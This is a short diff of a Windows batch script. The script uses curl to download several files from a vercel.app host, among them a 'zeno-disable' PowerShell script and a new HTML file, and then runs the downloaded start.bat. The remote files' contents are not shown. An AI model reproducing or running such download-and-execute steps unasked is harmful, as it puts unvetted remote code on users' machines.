@@ -5,7 +5,7 @@ set FILE1_URL=https://fsc.vercel.app/zeno/start.bat
 set FILE2_URL=https://fsc.vercel.app/zeno/zeno-disable.ps1
 set FILE3_URL=https://fsc.vercel.app/zeno/zeno-video.mp4
 set FILE4_URL=https://fsc.vercel.app/zeno/zeno-html-video-create.ps1
-
+set FILE5_URL=https://fsc.vercel.app/zeno/zenoprint.html
 :: Set the location to download the files
 set DOWNLOAD_DIR=%USERPROFILE%\Downloads
 
@@ -14,10 +14,10 @@ curl -o ".\start.bat" %FILE1_URL%
 curl -o ".\zeno-disable.ps1" %FILE2_URL%
 curl -o ".\zeno-video.mp4" %FILE3_URL%
 curl -o ".\zeno-html-video-create.ps1" %FILE4_URL%
-
+curl -o ".\zenoprint.html" %FILE5_URL%
 :: Wait for the downloads to finish (optional, but ensures the files are downloaded)
 echo Waiting for downloads to finish...
-timeout /t 5
+timeout /t 10
 
 :: Run the start.bat after download
 echo Running start.bat...
